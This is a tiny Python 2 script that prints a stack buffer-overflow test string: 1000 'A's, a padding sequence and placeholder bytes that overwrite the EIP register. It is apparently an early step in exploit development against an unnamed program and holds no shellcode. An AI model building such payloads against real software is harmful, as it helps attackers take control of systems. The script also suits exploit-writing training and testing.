#!/usr/bin/python2
prefix = 'A' * 1000
padding1 = '0001020304050607080910111213'
eip = '\x41\x42\x43\x44'
print prefix + padding1 + eip
